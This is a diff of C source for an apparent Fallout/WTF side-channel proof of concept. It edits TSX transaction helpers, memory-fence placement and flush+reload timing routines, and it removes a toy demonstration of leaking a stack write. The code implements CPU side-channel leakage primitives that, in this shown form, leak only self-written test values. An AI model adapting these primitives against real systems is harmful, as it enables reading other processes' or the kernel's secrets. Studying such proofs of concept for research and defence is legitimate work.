@@ -10,16 +10,6 @@
 #include <errno.h>
 #include <fcntl.h>
 
-#if defined(__x86_64__)
-int fallout_compatible(){return 1;}
-#elif defined(__i386__)
-int fallout_compatible(){return 1;}
-#else
-
-int fallout_compatible() { return 0; }
-
-#endif
-
 
 uint64_t *wtf_times;
 ssize_t page_size;
@@ -30,13 +20,13 @@ jmp_buf buf;
 #ifdef TSX_AVAILABLE
 static __attribute__((always_inline)) inline unsigned int xbegin(void) {
     unsigned status;
-    //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
-    asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
+    asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
+    //asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
     return status == ~0u;
 }
 static __attribute__((always_inline)) inline void xend(void) {
-    //asm volatile("xend" ::: "memory");
-    asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+    asm volatile("xend" ::: "memory");
+    //asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
 }
 #endif
 
@@ -53,6 +43,7 @@ static inline void flush_mem(void *mem) {
     for (; i < 256; i++) {
         flush(mem + page_size * i);
     }
+    asm volatile("mfence");
 }
 
 static inline void maccess(void *p) {
@@ -81,7 +72,7 @@ static inline uint64_t rdtsc() {
 }
 
 static inline void data_bounce_asm(void *ptr, void *mem, char success) {
-    asm volatile("mfence\nlfence");
+    asm volatile("mfence");
 #ifdef __x86_64__
     asm volatile("movq %%rcx, (%0)\n"\
                  "movq %%rdx, (%%rcx)\n"                                        \
@@ -215,7 +206,7 @@ int flush_cache(void *mem) {
 int toy_wtf(void *mem, int page_offset, int secret_value) {
     uint8_t *test = aligned_alloc(page_size, page_size);
     flush_mem(mem);
-    asm volatile("mfence\nlfence");
+    asm volatile("mfence");
     test[page_offset] = secret_value;
     FALLOUT_FAULTY_LOAD
     for (int i = 0; i < 256; i++) {
@@ -225,31 +216,6 @@ int toy_wtf(void *mem, int page_offset, int secret_value) {
     return get_min(wtf_times, 256) == secret_value;
 }
 
-void toy_write(int offset, uint8_t secret) {
-    uint8_t buffer[4096 << 1];
-    ((uint8_t * )((uint64_t)(&buffer[4096]) & (UINT64_MAX ^ 0xFFF)))[offset] = secret;
-}
-
-/**
- * Use WTF to observe a write to the stack
- * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
- * @param page_offset The page offset of the write access to observe.
- * @param secret_value The secret value to be written
- * @return Was the read successful?
- */
-volatile int toy_wtf_v2(void *mem, int page_offset, int secret_value) {
-    uint8_t *test = aligned_alloc(page_size, page_size);
-    flush_mem(mem);
-    asm volatile("mfence\nlfence");
-    for (int i = 0; i < 56; i++) test[i] = i;
-    toy_write(page_offset, (uint8_t) secret_value);
-    FALLOUT_FAULTY_LOAD
-    for (int i = 0; i < 256; i++) {
-        wtf_times[i] = measure_flush_reload(mem + i * page_size);
-    }
-    munmap(test, page_size);
-    return get_min(wtf_times, 256) == secret_value;
-}
 
 /**
  * Attempts a WTF read (for inline use).
